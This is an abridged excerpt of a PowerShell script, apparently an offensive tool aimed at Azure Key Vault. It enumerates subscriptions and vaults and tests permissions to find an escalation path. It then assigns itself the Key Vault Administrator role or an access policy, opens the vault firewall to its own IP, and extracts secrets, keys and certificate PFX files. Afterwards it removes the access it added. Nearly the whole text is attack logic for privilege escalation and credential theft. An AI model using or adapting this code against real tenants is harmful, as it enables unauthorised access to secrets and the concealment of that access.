...
function Invoke-RenewToken {
    ...
    switch ($global:AuthMethod) {
        ...
        "Manual" {
            Write-Host "`n`t[!] Cannot auto-renew Managed Identity tokens." -ForegroundColor Yellow
            ...
            Write-Host "`t[?] Paste new Vault AccessToken:" -ForegroundColor Cyan
            ...
            Write-Host "`t[+] Tokens updated (Manual)" -ForegroundColor Green
            return $global:AccessToken
        }
        default {
...
function Invoke-GetTokens {
    ...
    if ($AccessToken) {
        ...
        Write-Host "[?] Paste Vault AccessToken (vault.azure.net):" -ForegroundColor Cyan

        $vt = Read-Host "  VaultToken"
        if (-not [string]::IsNullOrWhiteSpace($vt)) {
            $global:VaultToken = $vt.Trim()
            Write-Host "[+] Vault Token set" -ForegroundColor Green
        }
        return $global:AccessToken
    }
...
function Test-OpAllowed {
    param([string[]]$Allowed, [string[]]$Denied, [string]$Operation)
    $match = $false
...
function Extract-VaultData {
    ...
    foreach ($k in $kinds) {
        ...
        while ($null -ne $uri) {
            try {
                $page = Invoke-SmartVaultRequest -Uri $uri # Withoutt the Method
            }
            catch {
            ...
            foreach ($item in $page.value) {
                ...
                try {
                     $detail = Invoke-SmartVaultRequest -Uri $getUri 
                }
                catch { 
                    continue 
                }
                ...
                switch ($k.Kind) {
                    ...
                    "Certificate" {
                        ...
                        # Try to get PFX via secrets endpoint
                        try {
...
$script:KV_ADMIN_ROLE = "00482a5a-887f-4fb3-b363-3b7fe8e74483" # Key Vault Administrator role definition GUID
...
function Add-VaultAccess {
    param(
        ...
        [string]$VaultId,
        [string]$SubscriptionId,
        [string]$Mode,        # "RBAC" or "AccessPolicy"
        [string]$MyOid,
        [string]$MyIP
    )

    $changes = @{ RoleAdded = $false; RoleAssignmentId = $null; IPAdded = $false; APAdded = $false }
    $headers = Get-AuthHeaders
    ...
    if ($MyIP) {
        try {
            ...
            $vault = Invoke-SmartRequest -Uri "https://management.azure.com$VaultId`?api-version=2022-07-01" -Headers $headers -Method GET
        ...
        catch { Write-Host "    [-] Failed to add IP to network rules: $_" -ForegroundColor Red }
    }
...
function Test-VaultPermissions {
    ...
    $result = @{
        ...
        CanReadCerts = $false
        CanEscalate = $false
        EscalateMethod = $null  # "RBAC-RoleAssign" | "RBAC-VaultWrite" | "AP-Write" | "AP-FW"
    }
    ...
    if ($Mode -eq "RBAC") {
        ...
        try { 
            $perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers -Method GET 
        }
        catch {
             return $result 
        }

        $allowD = @(); $denyD = @(); $allow = @(); $deny = @()
        ...
        # Escalation: can we assign ourselves KV Administrator?
        $canRBAC = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.Authorization/roleAssignments/write'
        $hasStar = Test-OpAllowed -Allowed $allow -Denied $deny -Operation '*'
        $canVaultW = Test-OpAllowed -Allowed $allow -Denied $deny -Operation 'Microsoft.KeyVault/vaults/write'

        if ($canRBAC -or $hasStar) {
            $result.CanEscalate = $true
            $result.EscalateMethod = "RBAC-RoleAssign"
        }
        elseif ($canVaultW) {
            $result.CanEscalate = $true
            $result.EscalateMethod = "RBAC-VaultWrite"
        }
    }
    else {
        # AccessPolicy mode - check if our OID is in the policy
        ...
        $permUrl = "https://management.azure.com$VaultId/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
        try { $perm = Invoke-SmartRequest -Uri $permUrl -Headers $Headers -Method GET}
        catch { return $result }
...
function main {
    ...
    if ($GUI) {
        ...
        if ($creds) {
            ...
            $TenantName = $creds.Domain
        }
        else {
             Write-Host "[-] Login cancelled." -ForegroundColor Red
             return 
            }
    }
    ...
    if (Test-Path $dataPath) { Remove-Item $dataPath -Force }
    ...
    $subResp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $headers -Method GET
    ...
    foreach ($sub in $subs) {
        ...
        Write-Host "  Permission:   $subPerm" -ForegroundColor $(if ($subPerm -match "Owner|Contributor") {
             "Yellow" 
            } else {
                 "Gray" 
            }
        ...
        if ($subPerm -eq "Reader") {
            Write-Host "  [!] Reader only - skipping..." -ForegroundColor DarkGray
            continue
        }
        ...
        $kvList = Invoke-SmartRequest -Uri $kvUri -Headers $headers -Method GET
        ...
        foreach ($kv in $kvList.value) {
            ...
            # Get vault detail
            $kvDetail = Invoke-SmartRequest -Uri "https://management.azure.com$vaultId`?api-version=2022-07-01" -Headers $headers -Method GET
            ...
            if ($canRead) {
                ...
                if ($global:VaultToken) {
                    ...
                    if ($count -eq -1) {
                        # Firewall blocked - fall through to escalation
            ...
            if ($global:AuthMethod -eq "Manual") {
                Write-Host "    [!] Manual token mode - cannot escalate. Skipping." -ForegroundColor DarkGray
                continue
            }

            if (-not $permCheck.CanEscalate) {
                Write-Host "    [-] No escalation path available. Skipping." -ForegroundColor Red
                continue
            }

            Write-Host "    [!] Escalating via $($permCheck.EscalateMethod)..." -ForegroundColor Yellow

            $changes = Add-VaultAccess -VaultName $vaultName -ResourceGroup $rg -VaultId $vaultId -SubscriptionId $sub.SubscriptionId -Mode $mode -MyOid $global:MyOid -MyIP $myIP

            if ($changes.RoleAdded -or $changes.APAdded) {
            ...
            Remove-VaultAccess -VaultName $vaultName -ResourceGroup $rg -VaultId $vaultId -SubscriptionId $sub.SubscriptionId -Mode $mode -MyOid $global:MyOid -MyIP $myIP -Changes $changes
        }
    }
...
main -ClientID $ClientID -ClientSecret $ClientSecret -Identity $Identity -TenantName $TenantName -GUI:$GUI
